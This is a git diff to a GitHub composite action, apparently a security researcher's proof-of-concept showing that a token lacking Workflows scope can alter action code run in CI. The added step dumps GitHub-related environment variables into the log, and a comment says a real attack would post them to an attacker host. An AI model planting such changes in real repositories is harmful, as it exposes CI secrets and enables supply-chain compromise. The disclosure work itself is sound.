@@ -1,7 +1,14 @@
 name: Greet
-description: A benign local composite action
+description: Now-malicious composite action (proof-of-concept)
 runs:
   using: "composite"
   steps:
-    - run: echo "benign greet from composite action"
+    - run: |
+        echo "=== TECHNIQUE-E BYPASS PROOF ==="
+        echo "composite action.yml was modified by a PAT lacking Workflows scope"
+        echo "GITHUB_TOKEN permissions: $(printenv | grep -i github || true)"
+        echo "event: $GITHUB_EVENT_NAME sha: $GITHUB_SHA repo: $GITHUB_REPOSITORY"
+        echo "Secrets would be accessible here via GITHUB_TOKEN and any workflow secrets"
+        # Exfil demonstration — in a real attack this would POST to an attacker host
+        echo "marker=BYPASS-E-SUCCESS-$(date +%s)"
       shell: bash
